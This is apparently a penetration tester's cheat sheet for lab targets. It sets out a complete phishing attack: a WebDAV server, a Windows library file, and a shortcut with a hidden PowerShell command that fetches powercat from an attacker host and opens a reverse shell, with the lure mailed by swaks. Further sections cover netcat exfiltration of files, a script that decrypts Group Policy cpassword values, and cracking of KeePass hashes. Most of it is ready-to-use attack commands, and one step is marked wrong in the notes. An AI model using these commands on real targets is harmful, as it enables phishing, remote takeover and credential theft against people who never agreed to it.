# 🔹Phishing 

### 1) Enable /webdav Server
```
python3 -m venv myenv
source myenv/bin/activate
pip3 install wsgidav
pip3 install cheroot
mkdir webdav
sudo wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
```
### 2) Create 'config.Library-ms'
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.239</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
### 3) Create lnk file (in WINDOWS) with PS payload (powercat)
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.155/powercat.ps1');powercat -c 192.168.45.155 -p 443 -e powershell"

# Powercat
https://github.com/besimorhino/powercat/blob/master/powercat.ps1
```
### 4) Staging 
- Place `powercat.ps1`, `shortcut.lnk`, `config.Library.ms` & `body.txt` in **/Webdav**
- nc -lnvp 1337 (from **/WebDav** to get `powercat.ps1`) <-- this is wrong
- nc -lnvp 443 (to catch reverse shell when .lnk gets clicked)
- `body.txt` has to sound convincing
```
 Hi,

 please click on the attachment
```
### 5) Execution (require mail credentials)

> jim@relia -> has to be legit recipient
```
swaks -t jim@relia.com --from test@relia.com --attach @config.Library-ms --server 192.168.186.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

# 🔹Transfer files (Windows to Linux)
```
# Windows TO
PS C:\temp> cmd /c "nc64.exe 192.168.174.245 4444 < C:\Scheduler\scheduler.exe"

# Linux
nc -lnvp 4444 > scheduler.exe
```


# 🔹Groups.xml
- AKA GPP (Group Policy Preferences)
- `Groups.xml` Likely in found `SYSVOL` folder, or `machines/preferences/group` or `/preferences/group`
- This is related to domain-connected workstation
```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
We can crack the cpassword with the following python script `ggp-decrypt.py`
```
#!/usr/bin/env python3

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

if __name__ == "__main__":
    key = b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
    iv = b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # CHANGE THIS CIPHER TEXT
    ciphertext = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ=="
    ciphertext = base64.b64decode(ciphertext)

    plaintext = cipher.decrypt(ciphertext)
    plaintext = unpad(plaintext, AES.block_size)

    print(plaintext.decode())
```
To use the script do the following
```
python3 -m venv venv
. venv/bin/activate
pip3 install pycryptodome
python3 gpp-decrypt.py
```
# 🔹.kdbx, KeePass
Extract Password Hash
```
keepass2john Database.kdbx > keepass.hash
```
Crack 
```
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
# If we hashcat we must remember to strip off the initial “Database:” from the hash.
hashcat -m 13400 keepass.hash rockyou.txt -r rockyou-30000.rule --force
```

Transfer files from window using nc
```
Get-Content "Database.kdbx" | .\nc.exe 192.168.45.239 5555
nc -lnvp 5555 > Database.kdbx
```

keepassxc 
```

```
